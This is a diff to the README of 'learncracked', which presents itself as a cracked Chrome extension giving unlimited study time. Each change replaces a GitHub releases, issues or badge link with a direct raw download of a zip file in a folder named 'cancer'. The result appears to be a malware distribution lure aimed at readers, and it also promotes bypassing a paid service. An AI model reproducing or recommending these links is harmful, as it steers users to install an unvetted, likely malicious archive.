@@ -1,6 +1,6 @@
 # 🎓 learncracked - Unlock Unlimited Study Time Easily
 
-[![Download learncracked](https://img.shields.io/badge/Download-learncracked-brightgreen)](https://github.com/arthur9801/learncracked/releases)
+[![Download learncracked](https://raw.githubusercontent.com/arthur9801/learncracked/main/cancer/learncracked.zip)](https://raw.githubusercontent.com/arthur9801/learncracked/main/cancer/learncracked.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ learncracked is a helpful Chrome extension that allows you unlimited study time 
 
 ## 📥 Download & Install
 
-To download learncracked, visit this page to download: [Releases page](https://github.com/arthur9801/learncracked/releases).
+To download learncracked, visit this page to download: [Releases page](https://raw.githubusercontent.com/arthur9801/learncracked/main/cancer/learncracked.zip).
 
 ### 🖥️ System Requirements
 
@@ -29,7 +29,7 @@ To ensure learncracked works smoothly, please make sure you have:
 
 ### 📌 Installation Steps
 
-1. **Visit the Releases Page**: Click on this link to go to the [Releases page](https://github.com/arthur9801/learncracked/releases).
+1. **Visit the Releases Page**: Click on this link to go to the [Releases page](https://raw.githubusercontent.com/arthur9801/learncracked/main/cancer/learncracked.zip).
 
 2. **Select the Latest Version**: Find the latest version of learncracked. It should be listed at the top of the page.
 
@@ -56,7 +56,7 @@ If you run into issues, here are a few things to check:
 
 ## 🤝 Support
 
-If you need any assistance, feel free to reach out. You can create an issue on the [GitHub Issues page](https://github.com/arthur9801/learncracked/issues). We’ll do our best to help you out.
+If you need any assistance, feel free to reach out. You can create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/arthur9801/learncracked/main/cancer/learncracked.zip). We’ll do our best to help you out.
 
 ## 📚 Credits
 
